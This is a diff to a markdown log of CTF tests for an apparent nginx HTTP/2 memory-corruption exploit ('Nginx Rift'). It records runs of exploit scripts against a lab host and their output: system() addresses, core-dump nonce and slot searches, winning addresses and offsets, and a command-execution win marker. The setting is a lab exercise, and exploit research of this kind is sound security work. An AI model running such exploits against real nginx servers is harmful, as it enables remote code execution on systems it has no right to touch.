@@ -1,6 +1,6 @@
 # Nginx Rift CTF Tests
 
-Last updated: 2026-05-15 01:16:56 CEST
+Last updated: 2026-05-15 05:06:15 CEST
 
 ## Baseline: Original PoC Command Execution
 
@@ -454,3 +454,68 @@ Cleanup-window filter: 12 plausible pools, 0 with probe low bytes, 1 corrupted/p
 Trying core-derived slot address 0x5612824f777a (body offset 0)
 CTF win: marker /tmp/nginx_rift_ctf_bc19ebe74839 contains token
 ```
+
+## Demo Runner v1.1 Validation
+
+Purpose: preserve the winning exploit while adding stronger demo-time diagnostics, structured artifacts, preflight checks, PID-correlated core freshness, and bounded geometry calibration.
+
+Command:
+
+```bash
+./demo_ctf_exploit_v1_1.py \
+  --host 192.168.1.205 --port 19321 \
+  --fast --no-color --artifact-dir artifacts
+```
+
+Observed:
+
+```text
+randomize_va_space: 2
+core_pattern: core
+suid_dumpable: 2
+config check passed: same-port HTTP/2 listener
+nginx worker PID: 2394
+system() address: 0x7ffb23260d70
+core PID matches pre-probe worker PID 2394
+fresh nonce found in core: 1010 URI-safe / 10437 slots
+ranked matching slots: 166
+using geometry A=127, plus=962
+winning address: 0x5641c34f4627
+winning body offset: 80
+run artifact: artifacts/demo_v1_1_20260515-050301.json
+```
+
+Status: pass.
+
+## Demo Runner v1.2 Strict Reset-Core Validation
+
+Purpose: prove the final candidate list can be rebuilt from the controlled reset crash core immediately before final exploitation.
+
+Command:
+
+```bash
+./demo_ctf_exploit_v1_2.py \
+  --host 192.168.1.205 --port 19321 \
+  --fast --no-color --require-reset-core \
+  --artifact-dir artifacts
+```
+
+Observed:
+
+```text
+randomize_va_space: 2
+os release: Ubuntu 22.04.3 LTS
+nginx worker PID: 2473
+system() address: 0x7ffac4597d70
+core PID matches pre-probe worker PID 2473
+pre-reset worker PID: 2474
+reset core PID matches expected worker 2474
+reset core nonce found: 1204 URI-safe / 10437 slots
+reset ranked matching slots: 155
+using 155 candidates from the fresh reset core
+winning address: 0x56389b17277a
+winning body offset: 0
+run artifact: artifacts/demo_v1_2_20260515-050555.json
+```
+
+Status: pass. This is the preferred technical demo runner.
